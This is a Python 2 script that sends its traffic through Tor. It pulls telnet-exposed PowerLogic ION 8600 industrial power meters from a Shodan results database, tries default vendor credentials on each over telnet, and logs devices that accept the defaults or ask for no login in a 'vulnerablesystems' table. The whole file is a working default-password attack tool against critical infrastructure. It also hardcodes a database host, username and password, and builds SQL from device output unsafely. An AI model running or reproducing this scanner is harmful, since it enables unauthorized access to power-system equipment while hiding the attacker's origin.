#!/user/bin/python

import socket
import socks
import telnetlib
import MySQLdb
import urllib
import json
import re

db = MySQLdb.connect("128.196.27.147","ShodanTeam","Sh0d@n7e")

def connectTor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    socket.socket = socks.socksocket

    data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
    print 'Testing data using IP: ' + data["ip"]

    cursor = db.cursor()

    try:
        sql = "SELECT * FROM shodan.sy_sfs_scadashodan  \
               WHERE queryname like '%8600%ION%' and port = 23"

            # % (keyword, keyword, keyword, keyword, keyword)
        try:
            # Execute the SQL command
            cursor.execute(sql)
            # Commit your changes in the database
            results = cursor.fetchall()
            if results == ():
                print('null')
                passID = 0
            else:
                for row in results:
                    nicknm = row[32]
                    ip = row[4]
                # Now print fetched result
                    print "IP =%s, nick=%s" % \
                       (ip, nicknm)
                    #requests.session(headers=headers, hooks=hooks, verify=False)
                    ipaddr = ip
                    #print('connected to device, no login')

                    sql = "SELECT * FROM passworddb.scadapasswords \
                           WHERE vendor = 'Powerlogic%8600'"

                    try:
                        # Execute the SQL command
                        cursor.execute(sql)
                        # Commit your changes in the database
                        results = cursor.fetchall()
                        for row in results:
                            passID = row[0]
                            UserName = row[9]
                            Password = row[10]
                        # Now print fetched result

                            HOST = ip
                            user = UserName
                            password = Password
                            
                            
                            tn = telnetlib.Telnet(HOST,'',2)
                            print "tel success"
                            
                            try:
                                line = tn.read_until("A$tring+hatWouldN0tExist", 3)

                                strline = str(line)
                                strline = strline.replace('\'','')
                                line = strline.lower()
                                #print line
                                if ("login" in line) or ("user" in line) or ("password" in line) or ("closing connection" in line):
                                    try:
                                        print passID
                                        try:
                                            tn.write(user + "\n")
                                            print "user success"
                                        except:
                                            print "fail user write"
                                            tn.close()
                                        if password:
#                                             reg = re.compile("password", re.I)
#                                             print tn.expect(reg)
                                            tn.read_until("assword: ")
                                            try:
                                                tn.write(password + "\n")
                                                print "pass success"
                                            except:
                                                print "pass failure"
                                                tn.close()
                                        try:
                                            line2 = tn.read_until("A$tring+hatWouldN0tExist", 3)
            
                                            strline = str(line2)
                                            strline = strline.replace('\'','')
                                            line2 = strline.lower()
                                            if not (("user:" in line2)or("username:" in line2)or("login:" in line2)or("password:" in line2)):
                                                try:
                                                    #print passID
                                                    sql = "INSERT INTO vulnerablesystems.telnetvuln(ipaddr, passwordid, notes, openport) \
                                                               VALUES ('%s', '%s', '%s', '%s')" % (ipaddr, passID, line, '')
                                                    tn.close()
                                                except:
                                                    print 'error on SQL insert'
                                                    tn.close()
                                                try:
                                                    # Execute the SQL command
                                                    cursor.execute(sql)
                                                    # Commit your changes in the database
                                                    db.commit()
                                                    print "successfully inserted a default pass"
                                                except Exception, e:
                                                        print 'Error: %s' % e
                                                        # Rollback in case there is any error
                                                        db.rollback()
                                                        print "Error inserting Data: rolledback"
                                                #print "ilon success!"
                                                #print line
                                                tn.close()
                                            else:
                                                print "A strange error occurred"
                                                tn.close()

                                        except:
                                            print"error on connecting"
                                            tn.close()

                                    except:
                                        print 'error on info retrieve'
                                        tn.close()

                                    tn.close()
                                else:
                                    print "No known login needed"
                                    try:
                                        #print passID
                                        sql = "INSERT INTO vulnerablesystems.telnetvuln(ipaddr, passwordid, notes, openport) \
                                                   VALUES ('%s', '%s', '%s', '%s')" % (ipaddr, '5002', line, 'no login needed')
                                        tn.close()
                                    except:
                                        print 'error on SQL insert'
                                        tn.close()
                                    try:
                                        # Execute the SQL command
                                        cursor.execute(sql)
                                        # Commit your changes in the database
                                        db.commit()
                                        print "successfully inserted a default pass"
                                    except Exception, e:
                                            print 'Error: %s' % e
                                            # Rollback in case there is any error
                                            db.rollback()
                                            print "Error inserting Data: rolledback"
                                    tn.close()

                                print tn.read_all()
                            except:
                                print "Telnet Server Not Available"
                                tn.close()


                    except:
                        print('server timeout')

        except Exception, e:
                print 'Error: %s' % e

    except Exception as e:
        print ('Error: %s' % e)
        db.close()

connectTor()
